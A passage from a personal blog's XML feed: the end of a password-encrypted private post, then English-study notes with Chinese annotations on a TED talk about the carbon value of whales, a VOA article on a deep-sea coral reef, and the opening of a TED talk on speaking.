0eb11870785dbb7bc7baca07bf3c9041c0aa73d912048cc37c8e316e8147d98e1ff3dc6079b13822741d2646b16f49441c43aead4a271a630b903831a82bd7632330ce9ebd6213258891e02ae2345a3e5c7b3f2194e02a0ae6ec98f675cd7187b1735ce1e4c4305fad20ee34c7746fb123538174415ce17779a59bd2a9ff7795463bb6249309e424d841398018939926ffff697ce5917825769445f7cce62a41d05a0bb1faa989ce6d477dce8aeff141528fcdbeb4709e35b24df134dcb6fed3ba86b23af6cd66581943efdefe38ae0944721d1fe6e5d89a3920eba1d0cef665a8ab52dc6c90fb7704335e36c5120d6c5480128f64b6944e32080a882fa4f0d8a8c864c7ba772bb025c4235ab69bfe02dd22b77455193c3722ddf423eca624ef3c901b412daca5a9f3c02ef60fb0add931a8417f5392c47d143b6fd54aee046ccdd749d80e7fc70d0309eb10e6b787b447c40ff2974e71802588195a091a6d079ca379404de3e670e62c2992e511a4aa4c321fb38ccd3b13a076ecd8bd71a1c7dd0f75e2845b175c26ea1a433bcb7892e061d54b4dbcab2c7df7d607786ea25eeb57d7e632303d9e927a4bc1de9d653cdc9e5e34b93b16a52cfae63264933b71b91155779c4db06d00729d07657e0cc367ec06350e7b5e4af9b97da6aa8af1c392af123ebe23d71e403103dcb6c22a28ca531dd7e402619b6bd377b4e235c88236002c8665adf3b78c0f7d177ca7377d6d1d3586251199dcd83702f480b157d7392ec72100a83772b8d460e02bb1b31e21374e69717880571f8e07e25829349f7b2791cf54e0bb7d837cb08e8b88fc40e81dd5e08790a564a3b6e89fca777d44014124460dbfc930d2d24fd0901215fff2c14255eec990b8c7b0a94fbc8c40fc611df35027e60728ed0d61fbb29efb4f3c0b475eb3f6f1dd55fe70822cf45b3aff88d392236e8c823b4ce2612874a72b9e03ca221f9691f2968fc4ef6f9edee0910d7c4422ee49c300d2d20ac56b3783018c5c51d5ee41cdea3d8a1fc7c95abab9e565e8251d8bdf27f0fbffaf0bafdb8cc169cea7a39a5d9e160c825cab2e1bac4a405fc1b95348ac4a32991f1ba168de69a32c0b07043c84b73d18f4d4de13c0d86b8b8ceaa3cb1f9635e1d076734b9c4cace68dbf8e276e771ecaab2774eb8d5f3c441f56d6ad4a70de629536f2e5090b673fd11e9234b00067e1de4956dd47275ce0f13f8a645a7649e712d83681220d45d1d0ed6582f4312d727429e87c0f61bdcd5358201459531e16fa441116f5727f99120c21474c5c277528fe1e670562c5fcc10d2e79fcbbc9749ea1d07bf928a58b2ceded755cc8d4ca20bc01e09c2f3f5455ced314ab927e957d88ad9d21a4144b21eb2689bd86ca8e8401469961482ab44c96a47630881c3d8cbaf7bb6f8f8084a19613563f888bd9c52d49251b8bfda8db6f961e44753a8337c59871ecca3ac75092c9fcc975db7f9d7558ec0e0b21ce4fefe6c5cabaf03a2043980709ddef21d4dac858124102d1e7772010d327641a75ef1f8c9db47b030f37422f0c8affd70a8fb56b0b347911234fe29c6d129753edc07d0cad113c1b252274cfd38a886b204c8d37050c1be5688d5b9d4907c3b0200711b4b6fe48f34459604803c2e55132fd5aac476431aac554e57da63e93bb17432c6a15a80dc7e93e6b0955d521bfba3488b293c0231775d460f9f647f21770c2b0260d50cac4ebfd331f32253c6055e0925055d4c04e348cbfff1606623e89ea13c696dd81bae4f8b64597e9da9ecfbf577b7e6ada008a02c7625deebaf20fc8bf258e583ed2d7ebea24a37cc71ad10ca53b9da0161aa39da13d6fa2aa9eca915327cd2828cf24c947f3a0899b8c942b7c5c14d88d5a70dc25e2ec311965c3ecfe4a32c1efe43f6293bffe462fc6d4982ccd293e29f4790aba1375c0194e4bf28db9237d63ab5b2b882db0a52ec78f9b0fab29271525f8d978a54b228086543049738de72f485ddde40c634e5d1f62fba266132b23d02a08ee50230352c03f9bc68bd002290303b9301eacdd03d5dbb0dd59e12fad1e66f0ec93d48f40442abb32e7299b991f2ef6a2d314adb6bf519cc3976ed29630da8522b2f67343bad2b452b0542cf9351ef52daa76daafec1c452524c0dfb9f73605db73a7c8c3ab1c506ede3ab87024172c629c5cf7073b7b129a3c51090c87d68428f36664a56e19de5d171a91e0ed0dedaf7d2f0c5640f6e213fdb79993691676172725d5f6cc8e4fcd6096615e9c233270037102169bdb59bb4a4c5d39300c04b9d83b9dc4c882727be0da8dec0872dd04c657dccb4cd0656a86af841ad62e50b73eaab7005398adbd7e05766ec19ac47c244c4fae3a40c9bf87642071814628f4a2ed012a88f2edaab41b8b14f397fffcb71581e4c6e2771a1f62351891d7cd174fe9f657b26c83581f490195a408f300f42cbe76d46064c753b990be376ec12fb5b2d2a9f7e024d90f80b4ef084ab6bed84cc57e2dd7ae2bb6072d733769d170fcb341fd29e46ef8f4ce9393a9e3c10eba255ad78035253250f831772ebe3436c91c120682ceac1fe463bd9d48510024f3046ec0547b646713c381ce5e7fea543c0490e80a14165620ea5fe19aa0e4d67b14c32c53ec4a5aa856ccfea86ad7f1d67e26a988159656d605edbe70625648d4eeffee1a08547d6224c7a905af1befcfe595dea2d8bf6970e77e2053b7e2dbe61a74efcf0ba831957243607c97f8c11211a4e2b8691a2b993dbcc1803eedd671c332c6f8f1327a05be67dc54513dbdd2584ffaddfa578e761f5c56f4f3ed736ceabd6a04278907502e68d7977120f59b5eb7e9ec3e4099bd34c2c24311a12d5ef52a790e0f39534051d00c12649b3f81065c8e786e544c5162d4c4a197e059f20f097cfe92b18ac87f1f0bf4e4bf2af87184abfebb6d2030ca57d98c3460addc784f7b09f8ebdcc9d8d1d401c57790c8d47beda59de0b2dd1f995cfd29b2d5d5432a3cebdd5a60720332cd9429ab30fd04ade98a3fcb745a4b32610a7423754bb1296d1674fcd4f02b70c470c87dea346d01e70e5c6a5039ee1894f4ff989be0bc1a6fd909d4677992654e38a42096bbedd7fe19686ce80be481934041236e498883ee8cd4cb0f7f35319423a74f6a942b8eb79abebbbdda0a68bf8e10441a679eec0b98ac76ee58d0b211b66ebe19bbfbe16fd021e71bb765747b5436ea899795e656cd5b8960f4cbb2bc040f4154e62918e656586334fdabb74c13f8e14fab101eb027925fe32fe4d04155f8905832946c2dbd74a016428a153c0e28b0b51a03ae0f45155082726907a81a1bc1b90634da725a79f922791d1818e38eb1a59ddbeaf7e2e8a506240536e66728dd07a559bd383f65a1365f3393014e287cd5c31c89afcdc6c67f92c1c2ff59f8ce20f52a752e96cb6973829ef17c5326b1334920380e82faf7de9d6761fd5a72d1976627a5ac83f6b619a9f7f65e57aedee08ec9e383805d28b50d43d1d42d6332d26612c10ed0ab6b998adb548d32865042b74e697e48bc614341390e422880b1d731f379433cfba75aaf1247d07ed1a27f09c77b227fa5ecc7eb1793c6d01f55784ffcfaa871ab9c4b76374085c330dcc93d07d9237ef1eb5682c0f71e7989ea8e433403ca7bf71d8921c5ae7c0058d945a46d1dd98b6145b7e0f693996e9b8cd3d02cc52652bd5b0be5cd3f023e69835f8d1a4e1e22e7e135fd027f4e58b6b27c9abe50a73f68680fda8145961239005ad2990b6838fefad9129a7735389846e7e02ee98a2ca2c2d3ad57ea3f013c1851635a492b3474e637d3144ef0d098e29e214f9f35388c671c9b1de98db74309070a6b8142969fca776acb70d0154d32eff5f384b1b2d4d3c472f18416377a202434bb1fae4a7a7fca505d2abce712439cf8435f2d1f5f8b1d3cffa69c495cbf73ebdb9c49ca12ebdbde2349abf2dcfc359adf0221f5f837a76a2c67bcef5650b6eca0e8f6ed19c76057d81d1f9497332d0f1116ff8cdd8eaf5213e0e165fa6e4420f5a99b98f9b9afa3070dc5721ab3028ff4d1b78e09801fca19cdf03d39ac0fd4428fcfed371efac1d392fc4ef4910342e0d21bb1fded676de0cf40f6e7a9a7478a359f2e8ba206363ef908bcd91afd9b8561651c6c9f154a11e93f6b4fd165f9f3cacfbb08167d2c2255ef013cbb07792c25c5675b2e1b32503499dcc11049b93505b3b02e3ff64e6797267aba08ece648c91b1e056933a8c69ddd79b4921df4c74888c12f8b325da58b3f88fb356330466aaa45c679126d634237dbbe680c6055d2cf903cb65c687e6a8b21a936291370f569dcb8c9a426bc0e317b59c902ddbb6fb589fa5d2512595f1ebfdd5f8001e0b0efd23622b424d342511d4db81c111099cd491499d1692b65a3ffde1581d5317d0ddb5abb89ef5b242cec300b8e3c40721754aaf1c77ee24578b05b8949f3bced6850b8e29cae4bd67bbe25607ab9f62fa6edce3b02dad0ceef101a6082ca7a2b64accb8988ceb8f1f9f9ce1e9605fbf65d93ed401e19313083abad2525e959ed293517087be0586047962d09bf04bdbc50936697ae7b3afbd9f3615bfbb486e02d21b7cabbcbb34f98fffff964d00e87d1b095db62ec2121996ff674ae29e1186b13ce5b492db039124ad82ba58cbdd20710aa38847c10223a61970f636c57016168e770de76e80f2f80cedc74c1dc552b352c2cecd6161a396ead8d4ae3c6ab86dceb1e445e25e8cebfce78a194917cea2665914601eeecc2c75d97e0fed49db2839be7b1c163b5b8d39bf448840c7e5d66eb0272496575022070cc2ed99da88fa9faaf43c90de6689512e96b8307f26c9041ec49f990615c9b9793c25fd523a48619456285615d2d1c48781bb92970166682a51bc78031f09067abe5d7df8a75fe9e23a233bc2ffbeedc8ea2690170fc0f6866e77e11514e9dcbf0051aeab56929fa6173cd626cd9dd40464c8d81e399e97fd08abfe2dbe918bf96e21f8ebd71b861ab684aee25361d1b26372dd6c4d9063bdf5ed612c9a35ba671137856be8461599a243fc12daf0561ba39e70a7defde8e9e1d1552cb309f1114cd8c3a8445ddbb7d505907a6933fbb5b517a1dd0cf7f5b7c9a18854466154ed8eb32e659f9ad6f73c4937a2b16899a7c38a50ed937009a2ab6e0af0e95c1b52e2776cb6c9a36cf99a4032eb574761f60ef67e17cacc892018a2b69f9877932ce581d3e237ccfb8529cf53f7cfcdb57f48f6dc99aac0ebdd2dc1d1962ecb613860618fdfde04f5a58d1ad7dbd1518dc8036fbf0cc9783bd17d215a683fc4194349846e236d8bb0b69c0e9e7d0a30025ea0fa6c5fa332837a2882909ee780e94a48a9292fe6a46cb664a6bc6f2eb5aa33a27aa4c1b2ffd5e69f84ccde8bc586f7633e6e59aab2814193d22c7e071d66842c5341fc8b0ef1a4f9c10227b2279ec38fce36e45ee8508370e3756f2e76b01642e589ed14815fb7114e7ead50dc43592b0fbba226294bd6c69886eba136dcaf6bfdcd6b3e5375f5171d0b63ca39b473c380709c778d21b9b33d39997ee471993345078468421f975bbee7289a50235cff06b1151d94306219ab6ec78b91fcf5e364fac94981c34769fd9acd8e70432f9850fdcc8b3ff0232e4bc7a69f8aeadee4a9acc35bd91a4544852d4c5c6f736b5ab56ad8eadb062d22912694f11c30f862bd7c3544ecdfc4a6117d183db3cb52cffd168ea6e1e5d5c146f145379b1eafa375b671f335a00173b442c3206aa433057ff1ad1d095084</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">吃点好的吧你!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>daily</tag>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>worth and economy详解</title>
    <url>/TED/TED_1/2023/12/19/</url>
    <content><![CDATA[<h2 id="What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature"><a href="#What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature" class="headerlink" title="What a living whale is worth – and why the economy should protect nature"></a>What a living whale is worth – and why the economy should protect nature</h2><p><strong>Ralph Chami |TED2022| April 2022</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AC4y197vF/?spm_id_from=333.880.my_history.page.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">一条活蓝鲸值多少钱？比你想象的多得多【TED演讲】_哔哩哔哩_bilibili</a></p>
<p><a href="https://pic.imgdb.cn/item/658184edc458853aef58b9a7.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320264.png"></a></p>
<p>In 2017, I confided( to tell someone you trust about personal things that you do not want other people to know) in a dear friend of mine that my lifelong wish was to see the blue whales. Before I knew it, I found myself with a bunch of researchers in the Sea of  <strong>Cortez</strong>（科尔特斯海） studying the blue whales. We used to be in a boat 25 foot long. And next to us … is this majestic（雄伟的，壮丽的） creature feeding gracefully next to us.</p>
<h2 id="Carbon-sequestration-of-the-whales-system"><a href="#Carbon-sequestration-of-the-whales-system" class="headerlink" title="Carbon sequestration of the whales system"></a>Carbon sequestration of the whales system</h2><p>Now you have to understand, at that point in time, I knew nothing about blue whales, or whales in general. I’m just a financial economist. But I learned something from them, which was really incredible.  It was already known in the science that whales capture so much carbon on their body and indirectly. And that’s, of course, very important for us because we are all facing the climate <strong>calamity</strong>（灾难，祸患） and we are all talking about how to grab carbon dioxide from the atmosphere. </p>
<p>Well, it turns out that the whales grab so much carbon dioxide from the atmosphere – by the way(顺便说, they eat and they <strong>poop</strong>(拉屎）. Yeah. It’s all about food. So how does the whale system work?</p>
<ol>
<li><h3 id="phytoplankton"><a href="#phytoplankton" class="headerlink" title="phytoplankton"></a>phytoplankton</h3><p> Well, it starts in the oceans. There’s these <strong>microscopic</strong> <strong>organisms</strong>（生物，有机体) called <strong>phytoplankton</strong>. (植物，浮游生物）Those phytoplankton do something really incredible. They grab so much carbon dioxide from the atmosphere, and they return oxygen to all of us.  Now how much carbon dioxide do they grab from the atmosphere? About 37 <strong>gigatons</strong>（十亿吨级） of carbon dioxide from the atmosphere. Truly the lungs of the planet are in the ocean. Now, if you want to visualize what 37 gigatons mean, that’s the <strong>equivalent</strong> of the carbon that is grabbed by four Amazon forests per year. That’s how much is being sucked in by these <strong>photosynthetic</strong>（光合作用） organisms. </p>
</li>
<li><h3 id="krill"><a href="#krill" class="headerlink" title="krill"></a>krill</h3><p>Now larger creatures called <strong>krill</strong>（ small shellfish）, love to eat phytoplankton directly or indirectly. And the whales love to feed on the krill. They feed so much on the krill that they grow bigger and bigger, and they store carbon in their body.  How much carbon do they store in their body? </p>
</li>
<li><h3 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h3><p>Roughly about seven to nine tons of carbon on their body. If you want to <strong>convert</strong>(转换) that to carbon dioxide, that’s about 33 tons of carbon dioxide being kept out of the atmosphere on the body of a single whale. If you want to visualize that, that’s the work of 1,500 trees on the body of a single whale. OK? But those guys, because they eat a lot, what do you do next? You poop a lot. And their poop turns out to be incredibly important because it fertilizes（受精，施肥[to put fertilizer on the soil to make plants grow]） the phyto(一种植物？）. So you have this wonderful cycle. OK? The whale feeds on the krill, the krill feeds on the phyto, and the phyto eats the poop of the whales to get more active. And when the phyto gets more active, it grabs more carbon dioxide from the atmosphere. So just imagine: the whales, they capture carbon on their body. Unfortunately, at some point they die, and they’re so heavy they sink to the bottom of the ocean. And anything below a thousand meters is sequestered(a sequestered place is quiet and far away from people) almost forever. And through their poop they also fertilize phyto, making phyto even more active, grabbing more carbon dioxide from the atmosphere.</p>
</li>
</ol>
<h2 id="The-bad-status-of-the-whales"><a href="#The-bad-status-of-the-whales" class="headerlink" title="The bad status of the whales"></a>The bad status of the whales</h2><p>So in a sense, the whales are incredible allies（同盟国） in the fight against climate change. Now that’s good news, right? Yeah.  Except that whales are dying. They’re dying from ship strikes. They’re dying from pollution, they’re dying from entanglements(纠缠，铁丝网围栏）. In fact, they’re dying because our current economic system puts a zero value on a living whale. But chop（<strong>cut some thing</strong>) a whale, sell it for its meat, it acquires a value. The value of a living whale is zero, zero dollars, zero in any currency（货币）.I’m a financial economist. And I’m listening to these scientists bemoaning(<strong>complain disappointed about some things</strong>) what’s happening to the whales. And I wanted to help. I didn’t know how to help. And I thought, wait a minute. Maybe I can bring your message to the audiences around the world. Maybe I can translate all of that value, those services they do for us in a language that we can all understand. </p>
<h2 id="translate-the-value"><a href="#translate-the-value" class="headerlink" title="translate the value"></a>translate the value</h2><p>Unfortunately, it’s a language of dollars and cents. So I set out with my team to value the services of a whale but one service – because the whales do a whole host of things. But I just wanted to value one thing, which is what is the value of their carbon sequestration(扣押) service to us? </p>
<p>Now how would you do something like that? After all, the whale is a living system. The whale captures carbon on her body, and she gives birth to baby whales who also grow up to capture carbon on their body. And they give birth to whales and so forth, and indirectly through the fertilization of phyto. So how would you do something like this? </p>
<p>Well, to do that, </p>
<p>I had to resort to what I do best, which is valuation. I looked at it, I said, wait a minute. This looks like a share of stock（股票） that pays dividends（红利）.Except those dividends are live dividends. They give birth to more dividends. So if I were to track the whale over her lifetime and keep track of all these dividends into the future, and then multiply that by the price of carbon, and discount（折价，折现，忽视） that all the way to the present, I can figure out what is the present value, discounted present value, of the lifetime earnings of a single whale. Would you like to know how much?</p>
<p>Would you like to know how much?（重复）</p>
<p>Audience: Yes!</p>
<p>RC: At least three million dollars. At least. Because I’m leaving so much out of this. But I just wanted to tell the good news that I heard on that boat. I didn’t know what to do. I was trying to help them out. But there’s more good news. Would you like to hear it?</p>
<p>Audience: Yes!</p>
<h2 id="Carbon-sequestration-of-the-other-creatures"><a href="#Carbon-sequestration-of-the-other-creatures" class="headerlink" title="Carbon sequestration of the other creatures"></a>Carbon sequestration of the other creatures</h2><ul>
<li><h3 id="elephants"><a href="#elephants" class="headerlink" title="elephants"></a>elephants</h3></li>
</ul>
<p>RC: Their cousins on land, the elephants in the forests of Africa, in the Congo Basin, （刚果盆地） they do the same thing. Turns out the way they walk and they eat and they poop, they increase carbon sequestration（扣押） in the trees, in the forests between seven and 14 percent. Just imagine, just by <strong>frolicking</strong>（play happily) around, they’re helping us to grab carbon dioxide from the atmosphere and fix it. So I thought, hey, maybe, maybe we can value their services too. Right? Same thing. But again, use the same model of valuation. You follow the same methodology（ the set of methods）, and you discount all of that to the present. And you ask yourself, what is the value of a single elephant’s carbon sequestration service? Would you like to know how much?</p>
<p>Audience: Yes!</p>
<p>RC: Here we go. 2.6 million dollars. Would you like to hear some more good news?</p>
<p>Audience: Yes!</p>
<ul>
<li><h3 id="forests"><a href="#forests" class="headerlink" title="forests"></a>forests</h3></li>
</ul>
<p>RC: Aside from forests – because we are land people, we just think of forests – go a little bit into the water. Sea grass, salt marsh（沼泽） mangroves（红树）, kelp（巨藻） forests, peat（泥炭） lands, wetlands – these are living systems that suck in so much carbon dioxide beyond your imagination, and they keep it forever in their roots as long as you leave them alone and you look after them .So … If you think these numbers are big, wait till you see what I’m about to tell you next. In sea grass alone, sea grass alone, carbon sequestration. How much do you think is the value of the global – If you look at globally the sea grass and you value their carbon sequestration service, how much you think it’s worth? You ready? 2.3 trillion dollars. That’s the size of the German stock market. </p>
<p>Now. What does this tell us? This tells us that a living and thriving（ a thriving company, business etc is very successful，欣欣向荣） nature is not only valuable intrinsically（本质的，内在的）, it’s also financially valuable to us. Question is, what do you do with this? So the science tells us what a wondrous Earth we are on. We can value it in dollars and cents. Question is, what are you going to do with it? Well, guess what? We can build a whole economy around a living and thriving nature, not an extractive（摘录的，片面的） view of nature, but a regenerative view of nature. And that economy –Thank you.</p>
<h2 id="The-way-to-build-the-economy"><a href="#The-way-to-build-the-economy" class="headerlink" title="The way to build the economy."></a>The way to build the economy.</h2><p>That economy is going to deliver for us sustainable and shared prosperity（兴隆） for all, big and small, all creatures on this planet. It does not have to be I win, you lose. It is a win-win. I’m going to show you how.From there we can build – In order to build that economy, we need three things. We need the science, the accounting, the scientific accounting. What is it that you have? How much of it do you have? Then people like me, financial economists, come around and they say, “What is the value of what you have?” The reason we value it is just to basically translate it into the language that policymakers can understand so they can make decisions. That’s all. It’s a translation. But then the third pillar is very important, which is the legal framing. The legal framing is very important because we need to protect the rights of nature, a living and thriving nature. Three things. Once you do these three things, you can create markets around nature. When I say markets around nature, not an extractive view of nature, but a regenerative view of nature. And I’m going to show you how. </p>
<p>I’m going to show you how. Gabon has 57,000 elephants. If you leave them alone, they can grow to 195,000 elephants. Gabon can sell the carbon offsets of its elephants. Imagine – because those elephants are grabbing carbon in the trees – they can sell the carbon offsets of their elephants. To whom? To us because we’re all enamoured（依恋的，迷恋的） with going carbon zero, carbon negative, carbon neutral（中立的）. And our money will come in to look after these elephants in perpetuity（永久的）. OK? So how much revenue（收入） can Gabon get out of it? One billion dollars a year from allowing these elephants to frolic freely, not be tied to anything, just by leaving them alone. Those elephants, by the way, they walk, they poop, just being, having babies, doing whatever they do, they help carbon sequestration in the forests.  </p>
<h2 id="The-nature-and-the-economy"><a href="#The-nature-and-the-economy" class="headerlink" title="The nature and the economy."></a>The nature and the economy.</h2><p>A forest without animals is dead. It’s not about flora（植物群）. It’s about flora and fauna（动物群）. It’s about nature itself. That’s what the message is. Who would buy these carbon offsets? All these companies and countries that made commitments to carbon zero, carbon negative, carbon neutral. They would buy the carbon offsets, or carbon credits if you like. The money would flow in from these ecosystem services – be it the whales, be it the elephants, be it mangrove（红树，一种热带作物）, sea grass, salt marsh – and the money goes in by contract（<strong>合同</strong>）, using block chain（区块链） technology to look after nature in perpetuity – very important – and to look after the stewards（男服务员，主管） of nature in perpetuity. And the stewards of nature are the local and the indigenous（土生土长的） population. They’re the ones who are doing the conservation（保护工作）, not you and me.</p>
<p>Once we do that – Notice what it is. It’s a win for nature. It’s a win for the economy. The government will make money because the government is going to get all that revenue. It will change its fiscal（财政的） stance. It will diversify its economy. It will grow in a sustainable way. It’s a win for the environment. It’s a win for all of these creatures that have suffered so much at our hands. It’s a win for this beautiful Earth of ours. As Carl Sagan once said, “The only Earth we’ll ever know. The only home we’ll ever know.” It’s a win for us. We are taking this work <strong>in Africa to Liberia（利比里亚）, Cameroon（柯麦隆）, Kenya（肯尼亚）, South Africa</strong>. We’re taking this work to <strong>the Americas, Chile（智利）, Argentina</strong>（阿根廷）. We’re doing it in the US and in the UK. Imagine, it just started with just a wish of mine to see a blue whale. Little did I know it’s going to end up with a vision of how we ought to live for tomorrow .</p>
<p>Thank you.</p>
<p>(Applause)</p>
]]></content>
      <categories>
        <category>TED</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>TED</tag>
      </tags>
  </entry>
  <entry>
    <title>Coral reef</title>
    <url>/VOA/VOA_1/2024/02/01/</url>
    <content><![CDATA[<h1 id="Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast"><a href="#Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast" class="headerlink" title="Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast"></a>Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast</h1><blockquote>
<p><a href="https://www.51voa.com/VOA_Special_English/scientists-map-largest-deep-sea-coral-reef-off-us-atlantic-coast-92138.html">The MP3</a></p>
</blockquote>
<h2 id="The-article"><a href="#The-article" class="headerlink" title="The article"></a>The article</h2><h3 id="Map-the-coral-reef"><a href="#Map-the-coral-reef" class="headerlink" title="Map the coral reef"></a>Map the coral reef</h3><p>Scientists have mapped the largest <strong>coral reef</strong> off America’s Atlantic coast.</p>
<p>Researchers say the reef stretches about 500 kilometers from Florida to South Carolina. At some points, it is 109 kilometers wide. The researchers measured the reef using <strong>3D</strong> mapping technology.</p>
<p>“It’s eye-opening – it’s breathtaking in <strong>scale</strong>,” Stuart Sandin told The Associated Press. He is a marine biologist at the Scripps Institution of Oceanography<code>the Scientific study of Ocean</code>. Sandin was not included in the research.</p>
<p>Ocean scientists have known since the 1960s that some coral life was present off the Atlantic Coast. But the reef’s exact size had remained a mystery. New underwater mapping technology made it possible to construct images of the ocean floor in three dimensions.</p>
<h3 id="Deep-coral-reef"><a href="#Deep-coral-reef" class="headerlink" title="Deep coral reef"></a>Deep coral reef</h3><p>The largest yet known deep coral reef “has been right under our noses, waiting to be discovered,” said Derek Sowers. He is an oceanographer at the nonprofit group <a href="https://nautiluslive.org/">Ocean Exploration Trust</a>.</p>
<p>Sowers and other scientists recently released maps of the reef in the publication <em>Geomatics</em>(在这里是一种出版物).</p>
<p>The reef was found at ocean depths from 200 to 1,000 meters. Deep-sea life cannot use sunlight to carry out <strong>photosynthesis</strong>. Instead, reef corals at extreme depths must <strong>filter</strong> food particles<code>a small piece of something</code> out of the water for energy.</p>
<p>Deep coral reefs are known to contain animals such as sharks, swordfish<code>a large fish with a sword on its head</code>, sea stars, octopus<code>a creature with eight tentacles</code>, shrimp and many kinds of fish.</p>
<h3 id="Tropical-coral-reefs"><a href="#Tropical-coral-reefs" class="headerlink" title="Tropical coral reefs"></a>Tropical coral reefs</h3><p>Unlike deep coral reefs, tropical<code>coming from the hottest parts of the world</code> reefs are better known to scientists and sea explorers alike because they are easier to reach. The world’s largest tropical coral reef system, Australia’s Great Barrier Reef, stretches for 2,300 kilometers.</p>
<p>Sowers said it is possible larger deep-sea reefs will be discovered in the future since only about 25 percent of the world’s ocean floor has been mapped in 3D. Only 50 percent of U.S. offshore waters have been mapped. Maps of the ocean floor are created using high-technology sound equipment, called sonar, on ships.</p>
<p>Erik Cordes is a marine biologist at Temple University and a co-writer of a study on the mapping operation. He said deep reefs cover more of the ocean floor than tropical reefs. But both are currently facing similar risks, including climate change and damage from oil and gas exploration activities</p>
<p align="right">I'm Bryan Lynn</p>
<p align="right">Edit by Vite</p>

<h2 id="Some-information"><a href="#Some-information" class="headerlink" title="Some information"></a>Some information</h2><h3 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h3><p><strong>coral</strong> <em>– n.</em> a hard, usually pink or white substance produced by a type of small sea animal</p>
<p><strong>reef</strong> <em>– n.</em> a collection of rocks or sand that sits below the surface of the ocean</p>
<p><strong>3D (three dimensional)</strong> –adj. showing the height, width and length of something rather than just two dimensions</p>
<p><strong>scale</strong> <em>– n.</em> the size or level of something</p>
<p><strong>photosynthesis</strong> <em>– n.</em> the process by which a plant uses carbon dioxide from the air, water from the ground, and the energy from the light of the sun to produce its own food and oxygen</p>
<p><strong>filter</strong> <em>– v.</em> to pass a substance through a piece of equipment in order to remove solid pieces or other substances</p>
<h3 id="Chinese-Translation"><a href="#Chinese-Translation" class="headerlink" title="Chinese Translation"></a>Chinese Translation</h3><blockquote>
<p>科学家们绘制了美国大西洋沿岸最大的珊瑚礁的地图。</p>
<p>研究人员说，珊瑚礁从佛罗里达延伸到南卡罗来纳州约500公里。在某些地方，它是109公里宽。研究人员使用3D测绘技术测量了珊瑚礁。</p>
<p>“这是大开眼界-它的规模惊人，”斯图尔特桑丁告诉美联社。他是斯克里普斯海洋研究所的海洋生物学家。桑丁没有被包括在研究中。<br>自20世纪60年代以来，海洋科学家就已经知道大西洋沿岸存在一些珊瑚生命。但珊瑚礁的确切大小仍然是个谜。新的水下测绘技术使绘制海底三维图像成为可能。</p>
<p>迄今为止已知的最大的深海珊瑚礁“就在我们的鼻子底下，等待着被发现，”德里克·索沃斯说。他是非营利组织海洋探索信托基金会的海洋学家。</p>
<p>Sowers和其他科学家最近在Geomatics出版物中发布了珊瑚礁的地图。</p>
<p>珊瑚礁是在200至1,000米的海洋深处发现的。深海生物不能利用阳光进行光合作用。相反，在极端深处的珊瑚礁必须过滤水中的食物颗粒以获取能量。</p>
<p>众所周知，深海珊瑚礁中有鲨鱼、旗鱼、海星、章鱼、虾和许多种类的鱼。</p>
<p>与深海珊瑚礁不同，热带珊瑚礁更容易被科学家和海洋探险家所了解，因为它们更容易到达。世界上最大的热带珊瑚礁系统，澳大利亚的大堡礁，绵延2,300公里。</p>
<p>Sowers说，未来可能会发现更大的深海珊瑚礁，因为世界上只有大约25%的海底被绘制成3D地图。只有50%的美国近海沃茨被绘制成地图。海底地图是使用船上的声纳绘制的。</p>
<p>Erik Cordes是坦普尔大学的海洋生物学家，也是一项关于测绘工作的研究的合著者。他说，深海珊瑚礁比热带珊瑚礁覆盖更多的海底。但两者目前都面临着类似的风险，包括气候变化和石油和天然气勘探活动造成的损害.</p>
</blockquote>
]]></content>
      <categories>
        <category>VOA</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>VOA</tag>
      </tags>
  </entry>
  <entry>
    <title>how to speak详解</title>
    <url>/TED/TED_2/2024/02/01/</url>
    <content><![CDATA[<h1 id="How-to-speak-so-that-people-want-to-listen"><a href="#How-to-speak-so-that-people-want-to-listen" class="headerlink" title="How to speak so that people want to listen"></a>How to speak so that people want to listen</h1><p><em><strong>Julian Treasure |TED Global 2013 |June 2013</strong></em></p>
<blockquote>
<p><strong><a href="https://www.bilibili.com/video/BV1Qe4y1B7E7/?spm_id_from=333.999.0.0&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">Speaking Video</a></strong></p>
</blockquote>
<p><a href="https://pic.imgdb.cn/item/65826028c458853aefbc80d0.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320041.png"></a></p>
<p>The human voice: It’s the instrument we all play. It’s the most powerful sound in the world, probably. It’s the only one that can start a war or say “I love you.” And yet many people have the experience that when they speak, people don’t listen to them. And why is that? How can we speak powerfully to make change in the world?What I’d like to suggest, there are a number of habits that we need to move away from. I’ve assembled for your pleasure here seven deadly sins of speaking.(说话的七宗罪) I’m not pretending this is an exhaustive(详细的) list, but these seven, I think, are pretty large habits that we can all fall into.（容易犯）     </p>
<h2 id="seven-deadly-sins-of-speaking"><a href="#seven-deadly-sins-of-speaking" class="headerlink" title="seven deadly sins of speaking"></a>seven deadly sins of speaking</h2><h3 id="gossip"><a href="#gossip" class="headerlink" title="gossip"></a>gossip</h3><p>First, gossip(流言，闲言碎语）. Speaking ill of somebody who’s not present. Not a nice habit, and we know perfectly well the person gossiping, five minutes later, will be gossiping about us.</p>
